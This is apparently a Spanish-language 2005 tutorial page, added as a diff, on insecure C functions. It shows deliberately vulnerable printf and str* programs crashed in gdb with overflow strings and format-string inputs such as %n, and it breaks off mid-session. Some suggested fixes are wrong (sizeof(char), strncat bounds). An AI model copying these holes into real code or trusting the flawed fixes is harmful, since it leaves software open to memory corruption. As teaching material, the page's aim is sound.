@@ -1,0 +1,1354 @@
+<html>
+
+<head>
+<title>Funciones Inseguras en C</title>
+<style>
+body{
+	  filter:alpha(opacity=90);
+      -moz-opacity:0.9;
+      opacity:0.9;
+      -khtml-opacity:0.9;
+      }
+code {
+    background-color: #FFFFF0;
+    color: #000000;
+	border: 1px solid #FFFFFF;
+	font-family: Verdana;
+	font-size: 10px;
+	font-style: normal;
+	font-weight: normal;
+	font-variant: normal;
+	display: block;
+	text-align: left;
+	vertical-align: top;
+	cell-padding: 4;
+	letter-spacing: normal;
+}
+span {
+	color: #00FF00;
+	font-size: 18px;
+	font-weight: bold;
+	text-decoration: underline;
+}
+a {
+	color: #CCCCCC;	
+}
+a:hover {
+	color: #EEEEEE;
+	font-weight: bold;
+}
+a:visited {
+	color: #CCCCCC;	
+}
+a:active {
+	color: #CCCCCC;	
+}
+</style>
+</head>
+
+<body bgcolor=#000000 text=#FFFFFF>
+
+<p><font face="Verdana" size="1">/*<br>
+&nbsp;&nbsp;&nbsp; Name: Funciones Inseguras en C<br>
+&nbsp;&nbsp;&nbsp; Copyright: [N]eo [S]ecurity [T]eam [NST]®<br>
+&nbsp;&nbsp;&nbsp; Author: HaCkZaTaN &lt;<a href="mailto:hck_zatan@hotmail.com">hck_zatan@hotmail.com</a>&gt;<br>
+&nbsp;&nbsp;&nbsp; Date: 01/08/05<br>
+&nbsp;&nbsp;&nbsp; Contact: Irc.gigachat.net #NST [NeoSecurity IRC]<br>
+&nbsp;&nbsp;&nbsp; Description: Funciones Inseguras en C<br>
+*/<br>
+<br>
+1. Introduccion.<br>
+2. Empezando.<br>
+3. *printf Family.<br>
+4. str* Family.<br>
+5. fopen.<br>
+6. gets &amp; fgets.<br>
+7. getenv.<br>
+8. *scanf Family.<br>
+9. syslog.<br>
+10. system.<br>
+11. OffOne.<br>
+12. Despedida.<br>
+13. Contacto.<br>
+<br>
+##################################################################################################<br>
+1. <b>Introduccion</b>.<br>
+<br>
+Hola a todos los lectores, una auditoria a un codigo en C puede ser una cosa que 
+la mayoria<br>
+de programadores no le ponen cuidado. Codean un programa o proyecto y lo sacan 
+con miles y miles<br>
+de vulnerabilidades. Este texto lo estoy haciendo por que busque acerca de esto 
+y no encontre uno<br>
+con todo lo que yo buscaba entonces me decidi a escribir uno. Si no les gusta el 
+texto o les parece<br>
+que no sirve de nada pues 'Sorry' lo hize por educacion no para placenterlos a 
+todos.<br>
+Aveces Format String Bugs son OverFlow.<br>
+##################################################################################################<br>
+<br>
+2. <b>Empezando</b>.<br>
+<br>
+Una PC (Ya sea con Linux, Unix, etc... no Windows)<br>
+Compilador (gcc, cc)<br>
+Debugger (gdb)<br>
+Conocimiento de C y ASM.<br>
+Una mente muy abierta.<br>
+Info acerca de mi lapTop:<br>
+<code><br>
+hackzatan@NeoSecurity:~$ uname -a<br>
+Linux NeoSecurity 2.6.7 #1 Wed Jun 16 16:23:03 PDT 2004 i686 unknown unknown 
+GNU/Linux<br>
+hackzatan@NeoSecurity:~$ gcc --version<br>
+gcc (GCC) 3.4.3<br>
+Copyright (C) 2004 Free Software Foundation, Inc.<br>
+This is free software; see the source for copying conditions. There is NO<br>
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<br>
+<br>
+hackzatan@NeoSecurity:~$ cat /proc/version<br>
+Linux version 2.6.7 (root@tree) (gcc version 3.3.4) #1 Wed Jun 16 16:23:03 PDT 
+2004<br>
+hackzatan@NeoSecurity:~$ cat /proc/cpuinfo<br>
+processor : 0<br>
+vendor_id : GenuineIntel<br>
+cpu family : 6<br>
+model : 6<br>
+model name : Mobile Pentium II<br>
+stepping : 10<br>
+cpu MHz : 363.985<br>
+cache size : 256 KB<br>
+fdiv_bug : no<br>
+hlt_bug : no<br>
+f00f_bug : no<br>
+coma_bug : no<br>
+fpu : yes<br>
+fpu_exception : yes<br>
+cpuid level : 2<br>
+wp : yes<br>
+flags : fpu vme de pse tsc msr pae mce cx8 sep mtrr pge mca cmov pat pse36 mmx 
+fxsr<br>
+bogomips : 716.80<br>
+<br>
+hackzatan@NeoSecurity:~$<br></code>
+<br>
+Es muy lenta mi LapTop. Me ragalan una?<br>
+##################################################################################################<br>
+<br>
+3. <b>*printf Family</b><br>
+A• printf — Imprime al screen.<br>
+B• sprintf — Imprime en una string.<br>
+C• snprintf — Imprime en una string calculando su longitud.<br>
+D• fprintf — Imprime a un Archivo.<br>
+E• vfprintf — Imprime a un archivo desde una estructura de 'va_arg'.<br>
+F• vsprintf — Imprime hacia un string desde una estructura de 'va_arg'.<br>
+G• vsnprintf — Imprime hacia un string desde una estructura de 'va_arg'.<br>
+<br>
+==================================================================================================<br>
+==================================================================================================
+<br>
+A• printf — Imprime al screen<br>
+printf() si no lo usas de la forma apropiada nos puede causar un format bug.<br>
+Sintaxis: extern int printf (__const char *__restrict __format, ...);<br>
+Ejemplo: printf(&quot;%s&quot;,Buffer);<br>
+Un codigo vulnerable seria:<br>
+//printf.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat printf.c<br>
+int main(int argc, char *argv[])<br>
+{<br>
+char Buffer[128]; // Buffer Size<br>
+sprintf(Buffer, argv[1]); //Buffer Overflow y depronto Format String =)<br>
+printf(Buffer); //Format String &lt;&lt; este es el que nos interesa<br>
+printf(&quot;\n&quot;);<br>
+return 0;<br>
+}<br></code>
+Bueno a plena vista vemos que tiene un Bug en Printf.<br>
+<br>
+Como parcheariamos?<br>
+NO: printf(Buffer);<br>
+SI: printf(&quot;%s&quot;,Buffer);<br>
+Tambien podriamos utilizar<br>
+fputs(Buffer); /* para simple strings ;) */<br>
+Pero todavia tenemos otro bug en el sprintf() lo veremos en seguida<br>
+<br>
+==================================================================================================<br>
+==================================================================================================<br>
+B• sprintf — Imprime en una string<br>
+Sintaxis: extern int sprintf (char *__restrict __s,<br>
+__const char *__restrict __format, ...) __THROW;<br>
+Ejemplo: sprintf(Buffer, &quot;%s&quot;, argv[1]);<br>
+//snprintf.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat sprintf.c<br>
+int main(int argc, char *argv[])<br>
+{<br>
+char Buffer[128]; // Buffer Size<br>
+sprintf(Buffer, argv[1]); //Buffer Overflow y depronto Format String =)<br>
+printf(&quot;%s&quot;, Buffer);<br>
+printf(&quot;\n&quot;);<br>
+return 0;<br>
+}<br>
+<br>
+root@NeoSecurity:/home/hackzatan# gcc sprintf.c -o sprintf<br>
+root@NeoSecurity:/home/hackzatan# ./sprintf `perl -e 'print &quot;A&quot;x&quot;140&quot;'`<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+Segmentation fault<br>
+root@NeoSecurity:/home/hackzatan# gdb ./sprintf<br>
+GNU gdb 6.3<br>
+Copyright 2004 Free Software Foundation, Inc.<br>
+GDB is free software, covered by the GNU General Public License, and you are<br>
+welcome to change it and/or distribute copies of it under certain conditions.<br>
+Type &quot;show copying&quot; to see the conditions.<br>
+There is absolutely no warranty for GDB. Type &quot;show warranty&quot; for details.<br>
+This GDB was configured as &quot;i486-slackware-linux&quot;...Using host libthread_db 
+library &quot;/lib/libthread_db.so.1&quot;.<br>
+<br>
+(gdb) r `perl -e 'print &quot;A&quot;x&quot;140&quot;'`<br>
+Starting program: /home/hackzatan/sprintf `perl -e 'print &quot;A&quot;x&quot;140&quot;'`<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+<br>
+Program received signal SIGSEGV, Segmentation fault.<br>
+0x40035400 in __libc_start_main () from /lib/libc.so.6<br>
+(gdb) i r<br>
+eax 0x0 0<br>
+ecx 0x40139840 1075025984<br>
+edx 0x1 1<br>
+ebx 0x40138ff4 1075023860<br>
+esp 0xbffff6f0 0xbffff6f0<br>
+ebp 0x41414141 0x41414141<br>
+esi 0xbffff750 -1073744048<br>
+edi 0x2 2<br>
+eip 0x40035400 0x40035400<br>
+eflags 0x10286 66182<br>
+cs 0x73 115<br>
+ss 0x7b 123<br>
+ds 0x7b 123<br>
+es 0x7b 123<br>
+fs 0x0 0<br>
+gs 0x0 0<br>
+(gdb) q<br>
+The program is running. Exit anyway? (y or n) y<br>
+root@NeoSecurity:/home/hackzatan#<br></code>
+<br>
+Como parcheariamos?<br>
+sprintf(Buffer, &quot;%s&quot;, argv[1]); <br>
+No es la mejor forma pero se puede asi tambien, la otra forma que digo es:<br>
+snprintf(Buffer, sizeof(Buffer), &quot;%s&quot;, argv[1]);<br>
+<br>
+==================================================================================================<br>
+==================================================================================================<br>
+C• snprintf — Imprime en una string calculando su longitud<br>
+Sintaxis: extern int snprintf (char *__restrict __s, size_t __maxlen,<br>
+__const char *__restrict __format, ...)<br>
+__THROW __attribute__ ((__format__ (__printf__, 3, 4)));<br>
+Ejemplo: snprintf(Buffer, sizeof(char), &quot;%s&quot;, argv[1]);<br>
+// snprintf.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat snprintf.c<br>
+int main(int argc, char *argv[])<br>
+{<br>
+char Buffer[128]; // Buffer Size<br>
+snprintf(Buffer, sizeof(Buffer), argv[1]);<br>
+printf(&quot;%s&quot;, Buffer);<br>
+printf(&quot;\n&quot;);<br>
+return 0;<br>
+}<br>
+<br>
+root@NeoSecurity:/home/hackzatan# gcc snprintf.c -o snprintf<br>
+root@NeoSecurity:/home/hackzatan# ./snprintf<br>
+<br>
+root@NeoSecurity:/home/hackzatan# ./snprintf Hello<br>
+Hello<br>
+root@NeoSecurity:/home/hackzatan# ./snprintf %s%s%s<br>
+Segmentation fault (core dumped)<br>
+root@NeoSecurity:/home/hackzatan#<br></code>
+<br>
+Como parcheariamos?<br>
+sprintf(Buffer, &quot;%s&quot;, argv[1]); <br>
+No es la mejor forma pero se puede asi tambien, la otra forma que digo es:<br>
+snprintf(Buffer, sizeof(Buffer), &quot;%s&quot;, argv[1]);<br>
+<br>
+==================================================================================================<br>
+==================================================================================================<br>
+D• fprintf — Imprime a un Archivo<br>
+Sintaxis: extern int fprintf (FILE *__restrict __stream,<br>
+__const char *__restrict __format, ...);<br>
+Ejemplo: fprintf(stdout, &quot;%s&quot;, argv[1]);<br>
+//fprintf.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat fprintf.c<br>
+#include &lt;stdio.h&gt;<br>
+int main(int argc, char **argv)<br>
+{<br>
+fprintf(stdout, argv[1]);<br>
+fprintf(stdout, &quot;\n&quot;);<br>
+<br>
+exit(0);<br>
+}<br>
+root@NeoSecurity:/home/hackzatan# gcc fprintf.c -o fprintf<br>
+root@NeoSecurity:/home/hackzatan# ./fprintf<br>
+<br>
+root@NeoSecurity:/home/hackzatan# ./fprintf Hello<br>
+Hello<br>
+root@NeoSecurity:/home/hackzatan# ./fprintf %n%n<br>
+Segmentation fault (core dumped)<br>
+root@NeoSecurity:/home/hackzatan# gdb ./fprintf<br>
+GNU gdb 6.3<br>
+Copyright 2004 Free Software Foundation, Inc.<br>
+GDB is free software, covered by the GNU General Public License, and you are<br>
+welcome to change it and/or distribute copies of it under certain conditions.<br>
+Type &quot;show copying&quot; to see the conditions.<br>
+There is absolutely no warranty for GDB. Type &quot;show warranty&quot; for details.<br>
+This GDB was configured as &quot;i486-slackware-linux&quot;...Using host libthread_db 
+library &quot;/lib/libthread_db.so.1&quot;.<br>
+<br>
+(gdb) r %n%n<br>
+Starting program: /home/hackzatan/fprintf %n%n<br>
+<br>
+Program received signal SIGSEGV, Segmentation fault.<br>
+0x4005cb1a in vfprintf () from /lib/libc.so.6<br>
+(gdb) where<br>
+#0 0x4005cb1a in vfprintf () from /lib/libc.so.6<br>
+#1 0x400630af in fprintf () from /lib/libc.so.6<br>
+#2 0x08048416 in main ()<br>
+(gdb)<br></code>
+<br>
+Como parcheariamos?<br>
+fprintf(stdout,&quot;%s&quot;, argv[1]);<br>
+fprintf(stdout, &quot;\n&quot;);<br>
+#Test<code><br>
+root@NeoSecurity:/home/hackzatan# cat fprintf.c<br>
+#include &lt;stdio.h&gt;<br>
+int main(int argc, char **argv)<br>
+{<br>
+fprintf(stdout,&quot;%s&quot;, argv[1]);<br>
+fprintf(stdout, &quot;\n&quot;);<br>
+<br>
+exit(0);<br>
+}<br>
+root@NeoSecurity:/home/hackzatan# gcc fprintf.c -o fprintf<br>
+root@NeoSecurity:/home/hackzatan# ./fprintf<br>
+(null)<br>
+root@NeoSecurity:/home/hackzatan# ./fprintf %n%n%n<br>
+%n%n%n<br>
+root@NeoSecurity:/home/hackzatan#<br>
+<br></code>
+==================================================================================================<br>
+==================================================================================================<br>
+E• vfprintf — Imprime a un archivo desde una estructura de 'va_arg'<br>
+Sintaxis: extern int vfprintf (FILE *__restrict __s, __const char *__restrict 
+__format,<br>
+_G_va_list __arg);<br>
+Ejemplo: vfprintf(stdout, &quot;%s&quot;, pArgs);<br>
+//vfprintf.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat vfprintf.c<br>
+#include &lt;stdio.h&gt;<br>
+#include &lt;stdarg.h&gt;<br>
+<br>
+int main(int argc, char **argv)<br>
+{<br>
+va_list pArgs;<br>
+vfprintf(stdout, argv[1], pArgs);<br>
+va_end(pArgs);<br>
+exit(0);<br>
+}<br>
+<br>
+root@NeoSecurity:/home/hackzatan# gcc vfprintf.c -o vfprintf<br>
+root@NeoSecurity:/home/hackzatan# ./vfprintf<br>
+root@NeoSecurity:/home/hackzatan# ./vfprintf `perl -e 'print &quot;%n&quot;x&quot;10&quot;'`<br>
+Segmentation fault (core dumped)<br>
+root@NeoSecurity:/home/hackzatan# gdb -c core<br>
+GNU gdb 6.3<br>
+Copyright 2004 Free Software Foundation, Inc.<br>
+GDB is free software, covered by the GNU General Public License, and you are<br>
+welcome to change it and/or distribute copies of it under certain conditions.<br>
+Type &quot;show copying&quot; to see the conditions.<br>
+There is absolutely no warranty for GDB. Type &quot;show warranty&quot; for details.<br>
+This GDB was configured as &quot;i486-slackware-linux&quot;.<br>
+Core was generated by ` printf %n%n%n%n%n%n%n%n'.<br>
+Program terminated with signal 11, Segmentation fault.<br>
+#0 0x4005cb1a in ?? ()<br>
+(gdb) i r ebp eip<br>
+ebp 0xbffff738 0xbffff738<br>
+eip 0x4005cb1a 0x4005cb1a<br>
+(gdb) set $p=0xbffff000<br>
+(gdb) while(*$p!=0x41414141)<br>
+&gt;set $p=$p+1<br>
+&gt;end<br>
+(gdb) x/30x $p<br>
+0xbffff909: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbffff919: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbffff929: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbffff939: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbffff949: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbffff959: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbffff969: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbffff979: 0x41414141 0x41414141<br>
+(gdb)<br></code>
+<br>
+==================================================================================================<br>
+==================================================================================================<br>
+F &amp; G• vsprintf — Imprime hacia un string desde una estructura de 'va_arg'<br>
+Sintaxis: extern int vsprintf (char *__restrict __s, __const char *__restrict 
+__format,<br>
+_G_va_list __arg) __THROW;<br>
+Ejemplo: vsprintf(str,&quot;%s&quot;,varlist);<br>
+vsnprintf(buffer, sizeof(char), format, val);<br>
+<br>
+//vsprintf.c<br>
+Taken from bugtraq:<br>
+<br>
+- In the function &quot;sendstrf&quot;<br>
+<code><br>
+21 int sendstrf(int s, char *format, ...) {<br>
+22 va_list val;<br>
+23 char buffer[256];<br>
+24 va_start(val, format);<br>
+25 vsprintf(buffer, format, val); // Buffer Overflow <br>
+26 va_end(val);<br>
+27 return send(s, buffer, strlen(buffer), 0);<br>
+28 }<br></code>
+<br>
+- In the function &quot;dirlist&quot;<br>
+<code><br>
+60 else<br>
+61 foo = 1;<br>
+62 sendstrf(s, entry-&gt;d_name); // Format Bug<br>
+63 }<br></code>
+<br>
+El problema aqui es que vsprintf no verifica cuantos bytes habran entonces a la 
+hora de<br>
+listar un diretorio muy largo se hara un OverFlow.<br>
+Como creamos directorios maliciosos xD<br>
+<code>root@NeoSecurity:/home/hackzatan# touch `perl -e 'print &quot;A&quot;x213'`<br>
+root@NeoSecurity:/home/hackzatan# ls<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfoobar<br>
+root@NeoSecurity:/home/hackzatan# touch &quot;%p%p%p%p%p%p%p%p%p%p&quot;<br>
+root@NeoSecurity:/home/hackzatan# ls<br>
+%p%p%p%p%p%p%p%p%p%p<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfoobar<br>
+root@NeoSecurity:/home/hackzatan# touch &quot;%s%s%s%s%s%s%s&quot;<br>
+root@NeoSecurity:/home/hackzatan# ls<br>
+%p%p%p%p%p%p%p%p%p%p<br>
+%s%s%s%s%s%s%s<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfoobar<br>
+root@NeoSecurity:/home/hackzatan#<br></code>
+<br>
+Como parcheariamos?<br>
+vsprintf(buffer, format, val);<br>
+vsnprintf(buffer, sizeof(char), format, val);<br>
+<br>
+##################################################################################################<br>
+4. <b>str* Family</b><br>
+A• strcpy — Copia strings.<br>
+B• strncpy — Copia strings calculando su longitud.<br>
+C• strlcpy — Copia strings calculando su longitud retornando exactamente.<br>
+D• strcat — Añade copias de cadenas.<br>
+E• strncat — Añade copias de cadenas calculando su longitud.<br>
+F• strlcat — Añade copias de cadenas calculando su longitud retornando 
+exactamente.<br>
+G• strlen — Calcula el número de caracteres de la cadena<br>
+H• strcmp — Compara cadenas<br>
+I• strncmp — Compara cadenas , caracter NULL no se tiene en cuenta<br>
+<br>
+==================================================================================================<br>
+==================================================================================================<br>
+A• strcpy — Copia strings.<br>
+Sintaxis: char *strcpy(char *s1, const char *s2);<br>
+Ejemplo: strcpy( s1, s2 );<br>
+//strcpy.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat strcpy.c<br>
+int main(int argc, char **argv)<br>
+{<br>
+char buf[20];<br>
+strcpy(buf, argv[1]);<br>
+}<br>
+<br>
+root@NeoSecurity:/home/hackzatan# gcc strcpy.c -o strcpy<br>
+root@NeoSecurity:/home/hackzatan# ./strcpy<br>
+Segmentation fault<br>
+root@NeoSecurity:/home/hackzatan# ./strcpy `perl -e 'print &quot;A&quot; x 30;<br>
+&gt;<br>
+root@NeoSecurity:/home/hackzatan# ./strcpy `perl -e 'print &quot;A&quot; x 30'`<br>
+root@NeoSecurity:/home/hackzatan# ./strcpy `perl -e 'print &quot;A&quot; x 50'`<br>
+Segmentation fault<br>
+root@NeoSecurity:/home/hackzatan# gdb ./strcpy<br>
+GNU gdb 6.3<br>
+Copyright 2004 Free Software Foundation, Inc.<br>
+GDB is free software, covered by the GNU General Public License, and you are<br>
+welcome to change it and/or distribute copies of it under certain conditions.<br>
+Type &quot;show copying&quot; to see the conditions.<br>
+There is absolutely no warranty for GDB. Type &quot;show warranty&quot; for details.<br>
+This GDB was configured as &quot;i486-slackware-linux&quot;...Using host libthread_db 
+library &quot;/lib/libthread_db.so.1&quot;.<br>
+<br>
+(gdb) r `perl -e 'print &quot;A&quot; x 50'`<br>
+Starting program: /home/hackzatan/strcpy `perl -e 'print &quot;A&quot; x 50'`<br>
+<br>
+Program received signal SIGSEGV, Segmentation fault.<br>
+0x41414141 in ?? ()<br>
+(gdb) i r<br>
+eax 0xbffff720 -1073744096<br>
+ecx 0xfffffe4c -436<br>
+edx 0xbffff906 -1073743610<br>
+ebx 0x40138ff4 1075023860<br>
+esp 0xbffff750 0xbffff750<br>
+ebp 0x41414141 0x41414141<br>
+esi 0xbffff7b0 -1073743952<br>
+edi 0x2 2<br>
+eip 0x41414141 0x41414141<br>
+eflags 0x10282 66178<br>
+cs 0x73 115<br>
+ss 0x7b 123<br>
+ds 0x7b 123<br>
+es 0x7b 123<br>
+fs 0x0 0<br>
+gs 0x0 0<br>
+(gdb) x/200xb $esp-200<br>
+foo<br>
+0xbffff720: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+0xbffff728: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+0xbffff730: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+0xbffff738: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+0xbffff740: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+0xbffff748: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+(gdb)<br></code>
+<br>
+Como parcheariamos?<br>
+strcpy(buf, argv[1]); //buffer mal coding<br>
+strncpy(buf, argv[1],sizeof(buf)); //Es bueno pero tenemos adjacement memory bug<br>
+strlcpy(buf, argv[1],sizeof(buf)); //mejor utilizarlo asi:<br>
+<code>/*<br>
+char *dir, *file, buf[MAXPATHLEN];<br>
+size_t n;<br>
+<br>
+-=foo=-<br>
+<br>
+n = strlcpy(buf, dir, sizeof(buf));<br>
+if (n &gt;= sizeof(buf))<br>
+goto toolong;<br>
+if (strlcpy(buf + n, file, sizeof(buf) - n) &gt;= sizeof(buf) - n)<br>
+goto toolong;<br>
+*/<br></code>
+==================================================================================================<br>
+==================================================================================================<br>
+B &amp; C• strncpy — Copia strings calculando su longitud.<br>
+Sintaxis: char *strncpy(char *s1, const char *s2, size_t n);<br>
+Ejemplo: strncpy(vuln, argv[1], sizeof(vuln));<br>
+//strncpy.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat strncpy.c<br>
+#include &lt;stdio.h&gt;<br>
+<br>
+int main(int argc, char **argv)<br>
+{<br>
+char buf[5];<br>
+char vuln[10]; /*Primer Argumento*/<br>
+char str[100]; /*Segundo Argumento*/<br>
+<br>
+<br>
+if(argc &lt;= 2)<br>
+{<br>
+printf(&quot;%s\n&quot;,&quot;Use arg1 arg2&quot;);<br>
+exit(0);<br>
+}<br>
+<br>
+strncpy(vuln, argv[1], sizeof(vuln));<br>
+strncpy(str, argv[2], sizeof(str)); /*Overflow */<br>
+sprintf(buf,&quot;MSG: %s\n&quot;,vuln);<br>
+printf(&quot;%s\n&quot;,buf);<br>
+return(0);<br>
+}<br>
+<br>
+root@NeoSecurity:/home/hackzatan# gcc strncpy.c -o strncpy<br>
+root@NeoSecurity:/home/hackzatan# ./strncpy `perl -e 'print &quot;A&quot;x30'` `perl -e 
+'print &quot;B&quot;x20'`<br>
+MSG: AAAAAAAAAAÿ¿ë<br>
+MSG: AAAAAAAAAAÿ¿ë<br>
+MSG: AAAAAAA<br>
+<br>
+Segmentation fault<br>
+root@NeoSecurity:/home/hackzatan# gdb -q ./strncpy<br>
+Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.<br>
+(gdb) r `perl -e 'print &quot;A&quot;x30'` `perl -e 'print &quot;B&quot;x20'`<br>
+Starting program: /home/hackzatan/strncpy `perl -e 'print &quot;A&quot;x30'` `perl -e 
+'print &quot;B&quot;x20'`<br>
+MSG: AAAAAAAAAAÿ¿ë<br>
+MSG: AAAAAAAAAAÿ¿ë<br>
+MSG: AAAAAAA<br>
+<br>
+<br>
+Program received signal SIGSEGV, Segmentation fault.<br>
+0x41414141 in ?? ()<br>
+(gdb) i r<br>
+eax 0x0 0<br>
+ecx 0x40139840 1075025984<br>
+edx 0x38 56<br>
+ebx 0x40138ff4 1075023860<br>
+esp 0xbffff750 0xbffff750<br>
+ebp 0x4141203a 0x4141203a<br>
+esi 0xbffff7b4 -1073743948<br>
+edi 0x3 3<br>
+eip 0x41414141 0x41414141<br>
+eflags 0x10286 66182<br>
+cs 0x73 115<br>
+ss 0x7b 123<br>
+ds 0x7b 123<br>
+es 0x7b 123<br>
+fs 0x0 0<br>
+gs 0x0 0<br>
+(gdb)<br></code>
+<br>
+Como Parcheariamos?<br>
+Si estamos en *BSD con strlcpy<br>
+strncpy(vuln, argv[1], sizeof(vuln));<br>
+strncpy(str, argv[2], sizeof(str));<br>
+-<br>
+strlcpy(vuln, argv[1], sizeof(vuln));<br>
+strlcpy(str, argv[2], sizeof(str));<br>
+<br>
+otra manera seria haciendo algo como<br>
+<code><br>
+if(strlen(argv[1]) &gt; sizeof(buffer))<br>
+{<br>
+printf(&quot;\nArgument is TOO LONG!\n\n&quot;);<br>
+exit(0);<br>
+}<br></code>
+Pues yo utilizo esta a la hora de codear algo.<br>
+<br>
+==================================================================================================<br>
+==================================================================================================<br>
+D• strcat — Añade copias de cadenas.<br>
+Sintaxis: char *strcat(char*s1, const char *s2);<br>
+Ejemplo: strcat( s1, s2 );<br>
+//strcat.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat strcat.c<br>
+int main(int argc, char **argv[])<br>
+{<br>
+char buf[150];<br>
+strcat(buf, argv[1]);<br>
+}<br>
+root@NeoSecurity:/home/hackzatan# gcc strcat.c -o strcat<br>
+strcat.c: In function `main':<br>
+strcat.c:4: warning: passing arg 2 of `strcat' from incompatible pointer type<br>
+root@NeoSecurity:/home/hackzatan# ./strcat `perl -e 'print &quot;A&quot; x200'`<br>
+Segmentation fault<br>
+root@NeoSecurity:/home/hackzatan# gdb -q ./strcat<br>
+Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.<br>
+(gdb) r `perl -e 'print &quot;A&quot; x200'`<br>
+Starting program: /home/hackzatan/strcat `perl -e 'print &quot;A&quot; x200'`<br>
+<br>
+Program received signal SIGSEGV, Segmentation fault.<br>
+0x41414141 in ?? ()<br>
+(gdb) i r<br>
+eax 0xbffff610 -1073744368<br>
+ecx 0xbffff904 -1073743612<br>
+edx 0xfffffdd8 -552<br>
+ebx 0x40138ff4 1075023860<br>
+esp 0xbffff6c0 0xbffff6c0<br>
+ebp 0x41414141 0x41414141<br>
+esi 0xbffff720 -1073744096<br>
+edi 0x2 2<br>
+eip 0x41414141 0x41414141<br>
+eflags 0x10286 66182<br>
+cs 0x73 115<br>
+ss 0x7b 123<br>
+ds 0x7b 123<br>
+es 0x7b 123<br>
+fs 0x0 0<br>
+gs 0x0 0<br>
+(gdb)<br></code>
+<br>
+Como parcheariamos?<br>
+strcat(buf, argv[1]);<br>
+strncat(buf, argv[1], sizeof(buf));<br>
+<br>
+==================================================================================================<br>
+==================================================================================================<br>
+E• strncat — Añade copias de cadenas calculando su longitud.<br>
+Sintaxis: char *strncat(char*s1, const char *s2, size_t n);<br>
+Ejemplo: strncat( s1, s2, 3 );<br>
+//strncat.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat strncat.c<br>
+int main(int argc, char **argv[])<br>
+{<br>
+char buf[5];<br>
+char vuln[10]; /*Primer Argumento*/<br>
+char str[100]; /*Segundo Argumento*/<br>
+<br>
+<br>
+if(argc &lt;= 2)<br>
+{<br>
+printf(&quot;%s\n&quot;,&quot;Use arg1 arg2&quot;);<br>
+exit(0);<br>
+}<br>
+<br>
+strncat(vuln, argv[1], sizeof(vuln));<br>
+strncat(str, argv[2], sizeof(str)); /*Overflow */<br>
+sprintf(buf,&quot;MSG: %s\n&quot;,vuln);<br>
+printf(&quot;%s\n&quot;,buf);<br>
+return(0);<br>
+}<br>
+root@NeoSecurity:/home/hackzatan# gdb ./strncat<br>
+GNU gdb 6.3<br>
+Copyright 2004 Free Software Foundation, Inc.<br>
+GDB is free software, covered by the GNU General Public License, and you are<br>
+welcome to change it and/or distribute copies of it under certain conditions.<br>
+Type &quot;show copying&quot; to see the conditions.<br>
+There is absolutely no warranty for GDB. Type &quot;show warranty&quot; for details.<br>
+This GDB was configured as &quot;i486-slackware-linux&quot;...Using host libthread_db 
+library &quot;/lib/libthread_db.so.1&quot;.<br>
+<br>
+(gdb) disas main<br>
+Dump of assembler code for function main:<br>
+0x08048424 &lt;main+0&gt;: push %ebp<br>
+0x08048425 &lt;main+1&gt;: mov %esp,%ebp<br>
+-=foo bar=-<br>
+0x080484cf &lt;main+171&gt;: ret<br>
+End of assembler dump.<br>
+(gdb) break *0x080484cf<br>
+Breakpoint 1 at 0x80484cf<br>
+(gdb) r `perl -e 'print &quot;A&quot;x30'` `perl -e 'print &quot;B&quot;x20'`<br>
+Starting program: /home/hackzatan/strncat `perl -e 'print &quot;A&quot;x30'` `perl -e 
+'print &quot;B&quot;x20'`<br>
+<br>
+Program received signal SIGSEGV, Segmentation fault.<br>
+0x0804848c in main ()<br>
+(gdb) i r<br>
+eax 0x41414149 1094795593<br>
+ecx 0xbffff8db -1073743653<br>
+edx 0xbffff720 -1073744096<br>
+ebx 0x40138ff4 1075023860<br>
+esp 0xbffff698 0xbffff698<br>
+ebp 0xbffff748 0xbffff748<br>
+esi 0xbffff7b4 -1073743948<br>
+edi 0x3 3<br>
+eip 0x804848c 0x804848c<br>
+eflags 0x10202 66050<br>
+cs 0x73 115<br>
+ss 0x7b 123<br>
+ds 0x7b 123<br>
+es 0x7b 123<br>
+fs 0x0 0<br>
+gs 0x0 0<br>
+(gdb) set $p=0xbffff000<br>
+(gdb) while(*$p!=0x41414141)<br>
+&gt;set $p=$p+1<br>
+&gt;end<br>
+(gdb) x/10x $p<br>
